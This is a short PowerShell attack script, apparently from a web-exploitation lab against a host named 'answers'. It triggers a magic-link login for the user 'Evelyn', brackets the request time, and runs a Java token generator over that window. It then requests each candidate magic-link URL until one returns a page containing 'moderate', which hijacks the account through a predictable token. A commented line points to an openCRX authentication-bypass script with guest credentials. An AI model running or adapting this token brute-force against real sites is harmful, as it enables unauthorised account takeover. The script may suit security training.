$start = date +%s%3N
$res = iwr -Uri 'http://answers/generateMagicLink' -Method POST -Body 'username=Evelyn' -SkipHttpErrorCheck -MaximumRedirection 0  -ea SilentlyContinue
$end = date +%s%3N
write-host 'Date Range: ' $start $end
javac AnswersResetToken.java
java AnswersResetToken $start $end > tokens.txt
$count = 0
$tokens = gc tokens.txt
$tokens | % -Process {
    $link = 'http://answers/magicLink/' + $_
    $result = iwr -uri $link -SkipHttpErrorCheck -MaximumRedirection 1 -WebSession $session -ea SilentlyContinue
    if ($result.RawContent -like '*moderate*') {
        $link
        $result.RawContent
        $session
        $count
        break
    }
    ++$count
    
}
#python3 opencrx-auth-bypass.py -u guest -p donkey123

#rm *.txt
rm *.class

